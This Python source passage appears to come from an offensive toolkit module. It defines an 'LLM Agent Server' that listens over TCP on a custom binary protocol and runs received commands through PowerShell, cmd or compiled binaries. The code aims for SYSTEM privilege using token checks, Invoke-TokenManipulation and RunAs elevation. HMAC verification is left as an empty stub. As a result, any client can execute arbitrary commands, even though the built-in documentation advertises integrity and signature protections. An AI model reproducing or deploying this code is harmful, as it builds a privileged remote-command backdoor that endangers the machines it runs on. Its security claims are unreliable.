        lab_use = self.session_data.get('LAB_USE', 0)
        use_system = system_privilege if system_privilege is not None else self.system_privilege
        
        # Check SYSTEM token before execution if SYSTEM privilege is requested
        if use_system:
            token_check = self.check_system_token_pe5()
            if not token_check.get('has_system'):
                self.console.print("[yellow]Warning: SYSTEM token not detected, execution may fail[/yellow]")
        
        try:
            if language == 'python':
                cmd = [sys.executable, file_path] + args
                # If SYSTEM privilege needed, run via PowerShell with token manipulation
                if use_system:
                    ps_wrapper = f"$proc = Start-Process -FilePath '{sys.executable}' -ArgumentList '{file_path}', '{' '.join(args)}' -NoNewWindow -Wait -PassThru; exit $proc.ExitCode"
                    return execute_powershell(ps_wrapper, lab_use=lab_use)
                else:
                    result = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True,
                        timeout=30,
                        cwd=self.temp_dir
                    )
                    return result.returncode, result.stdout, result.stderr
            
            elif language == 'powershell':
                ps_cmd = f"& '{file_path}' {' '.join(args)}"
                if use_system:
                    # Wrap in token manipulation if needed
                    ps_cmd = f"$null = Invoke-TokenManipulation; {ps_cmd}"
                return execute_powershell(ps_cmd, lab_use=lab_use)
            
            elif language == 'batch':
                cmd = [file_path] + args
                cmd_str = ' '.join(cmd)
                if use_system:
                    # Run batch as SYSTEM via PowerShell
                    ps_cmd = f"Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', '{cmd_str}' -Verb RunAs -Wait"
                    return execute_powershell(ps_cmd, lab_use=lab_use)
                else:
                    return execute_cmd(cmd_str, lab_use=lab_use)
            
            elif language in ['c', 'cpp']:
                # Compile first, then execute
                if language == 'c':
                    compiler = 'gcc'
                    ext = '.exe'
                else:
                    compiler = 'g++'
                    ext = '.exe'
                
                exe_path = file_path.rsplit('.', 1)[0] + ext
                compile_cmd = [compiler, file_path, '-o', exe_path]
                
                compile_result = subprocess.run(
                    compile_cmd,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if compile_result.returncode != 0:
                    return compile_result.returncode, compile_result.stdout, compile_result.stderr
                
                # Execute compiled binary
                if use_system:
                    ps_cmd = f"Start-Process -FilePath '{exe_path}' -Verb RunAs -Wait"
                    return execute_powershell(ps_cmd, lab_use=lab_use)
                else:
                    result = subprocess.run(
                        [exe_path] + args,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    return result.returncode, result.stdout, result.stderr
            
            else:
                return 1, "", f"Unsupported language: {language}"
        
        except subprocess.TimeoutExpired:
            return 1, "", "Execution timed out after 30 seconds"
        except Exception as e:
            return 1, "", str(e)
    
    def cleanup(self):
        """Clean up temporary files"""
        import shutil
        try:
            shutil.rmtree(self.temp_dir)
        except Exception:
            pass


class LLMAgentServer:
    """LLM Agent Server - MEMSHADOW MRAC Protocol Implementation with Enhanced Code Generation"""
    
    def __init__(self, console: Console, session_data: dict, host: str = 'localhost', port: int = 8888,
                 session_token: Optional[bytes] = None, system_privilege: bool = True):
        self.console = console
        self.session_data = session_data
        self.host = host
        self.port = port
        self.session_token = session_token
        self.socket = None
        self.running = False
        self.code_generator = CodeGenerator(console, session_data, system_privilege=system_privilege)
        self.client_connections = []
        self.nonce_tracker = NonceTracker()
        self.registered_apps: Dict[bytes, Dict[str, Any]] = {}  # app_id -> app info
        self.sequence_num = 0
        self.app_id = uuid.uuid4().bytes  # This server's app_id
        self.system_privilege = system_privilege  # SYSTEM privilege execution enabled
        
        # Check SYSTEM token on initialization if SYSTEM privilege is enabled
        if system_privilege:
            token_status = self.code_generator.check_system_token_pe5()
            if token_status.get('has_system'):
                self.console.print(f"[green]✓ SYSTEM token verified via {token_status.get('method')}[/green]")
            else:
                self.console.print(f"[yellow]⚠ SYSTEM token not detected - will attempt escalation when needed[/yellow]")
    
    def check_system_token(self) -> Dict[str, Any]:
        """Check SYSTEM token status using PE5 method"""
        return self.code_generator.check_system_token_pe5()
        
    def start(self):
        """Start the LLM agent server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.running = True
            
            privilege_status = "[SYSTEM]" if self.system_privilege else "[USER]"
            token_status = ""
            if self.system_privilege:
                token_check = self.check_system_token()
                if token_check.get('has_system'):
                    token_status = " [SYSTEM TOKEN VERIFIED]"
                else:
                    token_status = " [SYSTEM TOKEN NOT DETECTED]"
            self.console.print(f"[green]LLM Agent Server started on {self.host}:{self.port} {privilege_status}{token_status}[/green]")
            
            while self.running:
                try:
                    client_socket, address = self.socket.accept()
                    self.console.print(f"[cyan]New connection from {address}[/cyan]")
                    
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()
                    self.client_connections.append(client_thread)
                
                except Exception as e:
                    if self.running:
                        self.console.print(f"[red]Error accepting connection: {e}[/red]")
        
        except Exception as e:
            self.console.print(f"[red]Failed to start server: {e}[/red]")
            self.running = False
    
    def stop(self):
        """Stop the LLM agent server"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
        self.code_generator.cleanup()
        self.console.print("[yellow]LLM Agent Server stopped[/yellow]")
    
    def _handle_client(self, client_socket: socket.socket, address: Tuple[str, int]):
        """Handle a client connection with MEMSHADOW protocol"""
        buffer = b''
        
        try:
            while self.running:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                buffer += data
                
                # Parse MEMSHADOW messages
                while len(buffer) >= 32:  # Minimum header size
                    try:
                        # Parse header
                        priority, flags, msg_type, batch_count, payload_len, timestamp_ns, sequence_num = \
                            MemshadowHeader.unpack(buffer[:32])
                        
                        total_length = 32 + payload_len
                        
                        if len(buffer) < total_length:
                            break  # Wait for more data
                        
                        header = buffer[:32]
                        payload = buffer[32:32+payload_len]
                        buffer = buffer[total_length:]
                        
                        # Process message
                        self._process_memshadow_message(client_socket, header, msg_type, flags, payload)
                    
                    except ValueError as e:
                        self.console.print(f"[red]Protocol error: {e}[/red]")
                        break
                    except struct.error as e:
                        self.console.print(f"[red]Struct error: {e}[/red]")
                        break
        
        except Exception as e:
            self.console.print(f"[red]Client {address} error: {e}[/red]")
        finally:
            client_socket.close()
            self.console.print(f"[dim]Client {address} disconnected[/dim]")
    
    def _process_memshadow_message(self, client_socket: socket.socket, header: bytes,
                                   msg_type: int, flags: int, payload: bytes):
        """Process incoming MEMSHADOW message"""
        try:
            # Verify HMAC if present
            if flags & HeaderFlags.HMAC_PRESENT:
                # HMAC verification would go here
                pass
            
            if msg_type == MRACMessageType.APP_REGISTER:
                self._handle_register(client_socket, header, payload, flags)
            
            elif msg_type == MRACMessageType.APP_COMMAND:
                self._handle_app_command(client_socket, header, payload, flags)
            
            elif msg_type == MRACMessageType.APP_HEARTBEAT:
                self._handle_app_heartbeat(client_socket, header, payload)
            
            elif msg_type == MRACMessageType.APP_BULK_COMMAND:
                self._handle_bulk_command(client_socket, header, payload, flags)
            
            else:
                self._send_app_error(client_socket, self.app_id, 0xFFFF, f"Unknown message type: {msg_type}")
        
        except Exception as e:
            self.console.print(f"[red]Message processing error: {e}[/red]")
            self._send_app_error(client_socket, self.app_id, 0xFFFF, str(e))
    
    def _handle_register(self, client_socket: socket.socket, header: bytes, payload: bytes, flags: int):
        """Handle APP_REGISTER message"""
        try:
            reg_data = MRACProtocol.unpack_register(payload)
            app_id = reg_data['app_id']
            nonce = reg_data['nonce']
            
            # Check nonce
            if not self.nonce_tracker.check_and_add(app_id, nonce):
                ack_payload = MRACProtocol.pack_register_ack(
                    app_id, 1, "Replay detected", self.session_token, nonce
                )
                self._send_memshadow_message(client_socket, MRACMessageType.APP_REGISTER_ACK, ack_payload, flags)
                return
            
            # Register app
            self.registered_apps[app_id] = {
                'name': reg_data['name'],
                'capabilities': reg_data['capabilities'],
                'registered_at': time.time_ns()
            }
            
            self.console.print(f"[green]App registered: {reg_data['name']} ({uuid.UUID(bytes=app_id)})[/green]")
            
            # Send ACK
            ack_payload = MRACProtocol.pack_register_ack(
                app_id, 0, "OK", self.session_token, nonce
            )
            self._send_memshadow_message(client_socket, MRACMessageType.APP_REGISTER_ACK, ack_payload, flags)
        
        except Exception as e:
            self.console.print(f"[red]Register error: {e}[/red]")
            self._send_app_error(client_socket, self.app_id, 0xFFFE, str(e))
    
    def _handle_app_command(self, client_socket: socket.socket, header: bytes, payload: bytes, flags: int):
        """Handle APP_COMMAND message with enhanced code generation"""
        try:
            cmd_data = MRACProtocol.unpack_command(payload)
            app_id = cmd_data['app_id']
            command_id = cmd_data['command_id']
            cmd_type = cmd_data['cmd_type']
            args = cmd_data['args']
            nonce = cmd_data['nonce']
            
            # Check nonce
            if not self.nonce_tracker.check_and_add(app_id, nonce):
                ack_payload = MRACProtocol.pack_command_ack(
                    app_id, command_id, 4, b"Replay detected", self.session_token, nonce
                )
                self._send_memshadow_message(client_socket, MRACMessageType.APP_COMMAND_ACK, ack_payload, flags)
                return
            
            self.console.print(f"[cyan]Processing command {command_id} type {cmd_type}[/cyan]")
            
            # Process command based on type
            if cmd_type == SelfCodeCommandType.SELF_CODE_PLAN_REQUEST:
                result = self._handle_plan_request(args)
            elif cmd_type == SelfCodeCommandType.SELF_CODE_APPLY_PATCH:
                result = self._handle_apply_patch(args)
            elif cmd_type == SelfCodeCommandType.SELF_CODE_TEST_RUN:
                result = self._handle_test_run(args)
            else:
                # Generic command execution
                result = self._handle_generic_command(cmd_type, args)
            
            # Send ACK
            result_bytes = json.dumps(result).encode('utf-8')
            ack_payload = MRACProtocol.pack_command_ack(
                app_id, command_id, 0 if result.get('success') else 1,
                result_bytes, self.session_token, nonce
            )
            self._send_memshadow_message(client_socket, MRACMessageType.APP_COMMAND_ACK, ack_payload, flags)
        
        except Exception as e:
            self.console.print(f"[red]Command error: {e}[/red]")
            cmd_data = MRACProtocol.unpack_command(payload)
            ack_payload = MRACProtocol.pack_command_ack(
                cmd_data['app_id'], cmd_data['command_id'], 1,
                json.dumps({'error': str(e)}).encode('utf-8'),
                self.session_token, cmd_data['nonce']
            )
            self._send_memshadow_message(client_socket, MRACMessageType.APP_COMMAND_ACK, ack_payload, flags)
    
    def _handle_app_heartbeat(self, client_socket: socket.socket, header: bytes, payload: bytes):
        """Handle APP_HEARTBEAT message"""
        # Heartbeats don't require ACK unless REQUIRES_ACK flag is set
        pass
    
    def _handle_bulk_command(self, client_socket: socket.socket, header: bytes, payload: bytes, flags: int):
        """Handle APP_BULK_COMMAND message"""
        # Parse bulk command and process each
        # Implementation would parse batch_count and iterate
        pass
    
    def _handle_plan_request(self, args: bytes) -> Dict[str, Any]:
        """Handle SELF_CODE_PLAN_REQUEST with enhanced planning"""
        try:
            data = json.loads(args.decode('utf-8')) if args else {}
            objective = data.get('objective', '')
            system_privilege = data.get('system_privilege', self.system_privilege)
            language = data.get('language', 'powershell')
            
            # Enhanced plan generation
            plan = {
                'objective': objective,
                'system_privilege': system_privilege,
                'language': language,
                'steps': [
                    {
                        'action': 'analyze',
                        'target': objective,
                        'description': 'Analyze requirements and constraints'
                    },
                    {
                        'action': 'generate_code',
                        'language': language,
                        'system_privilege': system_privilege,
                        'description': f'Generate {language} code with SYSTEM privilege' if system_privilege else f'Generate {language} code'
                    },
                    {
                        'action': 'validate',
                        'description': 'Validate generated code syntax'
                    },
                    {
                        'action': 'execute',
                        'system_privilege': system_privilege,
                        'description': 'Execute code with SYSTEM privileges' if system_privilege else 'Execute code'
                    },
                    {
                        'action': 'verify',
                        'description': 'Verify execution results'
                    }
                ]
            }
            
            return {'success': True, 'plan': plan}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _handle_apply_patch(self, args: bytes) -> Dict[str, Any]:
        """Handle SELF_CODE_APPLY_PATCH"""
        try:
            data = json.loads(args.decode('utf-8'))
            patch = data.get('patch', '')
            path = data.get('path', '')
            
            # Apply patch (simplified)
            # In real implementation, would use unified diff parser
            
            return {'success': True, 'files_changed': [path]}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _handle_test_run(self, args: bytes) -> Dict[str, Any]:
        """Handle SELF_CODE_TEST_RUN"""
        try:
            data = json.loads(args.decode('utf-8'))
            command = data.get('command', [])
            timeout_sec = data.get('timeout_sec', 120)
            
            # Execute test command
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout_sec
            )
            
            return {
                'success': result.returncode == 0,
                'exit_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _handle_generic_command(self, cmd_type: int, args: bytes) -> Dict[str, Any]:
        """Handle generic command execution"""
        try:
            # Parse args as JSON command
            data = json.loads(args.decode('utf-8')) if args else {}
            command = data.get('command', '')
            language = data.get('language', 'powershell')
            
            if language == 'powershell':
                exit_code, stdout, stderr = execute_powershell(
                    command,
                    lab_use=self.session_data.get('LAB_USE', 0)
                )
            else:
                exit_code, stdout, stderr = execute_cmd(
                    command,
                    lab_use=self.session_data.get('LAB_USE', 0)
                )
            
            return {
                'success': exit_code == 0,
                'exit_code': exit_code,
                'stdout': stdout,
                'stderr': stderr
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _send_memshadow_message(self, client_socket: socket.socket, msg_type: int,
                               payload: bytes, flags: int = 0, requires_ack: bool = False):
        """Send MEMSHADOW message"""
        if requires_ack:
            flags |= HeaderFlags.REQUIRES_ACK
        
        self.sequence_num += 1
        header = MemshadowHeader.pack(
            priority=0,
            flags=flags,
            msg_type=msg_type,
            batch_count=1,
            payload_len=len(payload),
            timestamp_ns=time.time_ns(),
            sequence_num=self.sequence_num
        )
        
        client_socket.sendall(header + payload)
    
    def _send_app_error(self, client_socket: socket.socket, app_id: bytes, error_code: int, detail: str):
        """Send APP_ERROR message"""
        error_payload = MRACProtocol.pack_error(app_id, error_code, detail, self.session_token)
        self._send_memshadow_message(client_socket, MRACMessageType.APP_ERROR, error_payload)
    


class LLMAgentModule:
    """LLM Agent Module for TUI"""
    
    def __init__(self):
        self.server = None
        self.server_thread = None
    
    def run(self, console: Console, session_data: dict):
        """Run LLM agent module"""
        while True:
            console.print(Panel(
                "[bold]LLM Remote Agent[/bold]\n\n"
                "Self-coding execution system with binary protocol communication.",
                title="Module 7",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "Start LLM Agent Server")
            table.add_row("2", "Stop LLM Agent Server")
            table.add_row("3", "Server Status")
            table.add_row("4", "Test Code Generation")
            table.add_row("5", "Protocol Documentation")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5'], default='0')
            
            if choice == '0':
                if self.server and self.server.running:
                    if Confirm.ask("[bold yellow]Stop server before exiting?[/bold yellow]", default=True):
                        self.server.stop()
                break
            
            elif choice == '1':
                self._start_server(console, session_data)
            
            elif choice == '2':
                self._stop_server(console)
            
            elif choice == '3':
                self._server_status(console)
            
            elif choice == '4':
                self._test_code_generation(console, session_data)
            
            elif choice == '5':
                self._protocol_documentation(console)
            
            console.print()
    
    def _start_server(self, console: Console, session_data: dict):
        """Start the LLM agent server"""
        if self.server and self.server.running:
            console.print("[yellow]Server is already running[/yellow]")
            return
        
        host = Prompt.ask("Server host", default="localhost")
        port = int(Prompt.ask("Server port", default="8888"))
        
        self.server = LLMAgentServer(console, session_data, host, port)
        
        self.server_thread = threading.Thread(target=self.server.start, daemon=True)
        self.server_thread.start()
        
        console.print(f"\n[green]Server starting on {host}:{port}...[/green]")
        console.print("[dim]Press Ctrl+C in server thread to stop[/dim]")
    
    def _stop_server(self, console: Console):
        """Stop the LLM agent server"""
        if not self.server or not self.server.running:
            console.print("[yellow]Server is not running[/yellow]")
            return
        
        self.server.stop()
        console.print("[green]Server stopped[/green]")
    
    def _server_status(self, console: Console):
        """Show server status"""
        if not self.server:
            console.print("[dim]Server not initialized[/dim]")
            return
        
        status = "Running" if self.server.running else "Stopped"
        console.print(f"\n[bold]Server Status:[/bold] {status}")
        
        if self.server.running:
            console.print(f"Host: {self.server.host}")
            console.print(f"Port: {self.server.port}")
            console.print(f"Active connections: {len(self.server.client_connections)}")
    
    def _test_code_generation(self, console: Console, session_data: dict):
        """Test code generation locally"""
        console.print("\n[bold cyan]Test Code Generation[/bold cyan]\n")
        
        language = Prompt.ask("Language", choices=['python', 'powershell', 'batch'], default='python')
        description = Prompt.ask("Code description", default="Print hello world")
        
        generator = CodeGenerator(console, session_data)
        
        spec = {
            'language': language,
            'description': description,
            'requirements': ['Print message', 'Return success'],
            'imports': []
        }
        
        try:
            code, file_path = generator.generate_code(spec)
            
            console.print(f"\n[green]Generated code:[/green]\n")
            console.print(f"[dim]{file_path}[/dim]\n")
            console.print(Panel(code, title="Generated Code", border_style="green"))
            
            if Confirm.ask("\n[bold]Execute generated code?[/bold]", default=False):
                exit_code, stdout, stderr = generator.execute_code(file_path, language)
                
                console.print(f"\n[bold]Execution Result:[/bold]")
                console.print(f"Exit Code: {exit_code}")
                if stdout:
                    console.print(f"Output:\n{stdout}")
                if stderr:
                    console.print(f"Error:\n{stderr}")
        
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        finally:
            generator.cleanup()
    
    def _protocol_documentation(self, console: Console):
        """Show MEMSHADOW MRAC protocol documentation"""
        console.print("\n[bold cyan]MEMSHADOW MRAC Protocol Documentation[/bold cyan]\n")
        
        doc = """
[bold]MEMSHADOW v2 Header (32 bytes):[/bold]
  MAGIC (4): "MSHW"
  VERSION (1): 2
  PRIORITY (1): Message priority
  FLAGS (1): HeaderFlags (REQUIRES_ACK, PQC_SIGNED, HMAC_PRESENT)
  MSG_TYPE (2): Message type (0x2100-0x21FF for MRAC)
  BATCH_COUNT (2): Number of batched messages
  PAYLOAD_LEN (4): Payload length
  TIMESTAMP_NS (8): Nanosecond timestamp
  SEQUENCE_NUM (4): Sequence number
  RESERVED (5): Reserved bytes

[bold]MRAC Message Types:[/bold]
  0x2101 - APP_REGISTER: Register application
  0x2102 - APP_REGISTER_ACK: Registration acknowledgment
  0x2103 - APP_COMMAND: Execute command
  0x2104 - APP_COMMAND_ACK: Command acknowledgment
  0x2105 - APP_TELEMETRY: Telemetry data
  0x2106 - APP_HEARTBEAT: Keep-alive
  0x2107 - APP_ERROR: Error message
  0x2108 - APP_BULK_COMMAND: Batched commands
  0x2109 - APP_BULK_COMMAND_ACK: Batched ACK

[bold]Self-Code Control Commands:[/bold]
  0x3001 - SELF_CODE_PLAN_REQUEST: Request code generation plan
  0x3002 - SELF_CODE_PLAN_RESPONSE: Plan response
  0x3003 - SELF_CODE_APPLY_PATCH: Apply code patch
  0x3004 - SELF_CODE_RESULT: Execution result
  0x3005 - SELF_CODE_TEST_RUN: Run tests

[bold]Payload Structure:[/bold]
  All payloads start with:
  - Auth[16]: SHA-256(session_token || timestamp_ns || nonce)[:16]
  - Nonce[8]: Monotonically increasing or random

[bold]Security Features:[/bold]
  - Nonce tracking per app_id (replay protection)
  - Optional HMAC-SHA256 integrity checking
  - Session token authentication
  - PQC signature support

[bold]Transport:[/bold]
  - TCP, UDP, QUIC, Unix domain sockets
  - MTU guidance: < 1200 bytes per payload
  - CGNAT support via relay/rendezvous
        """
        
        console.print(doc)
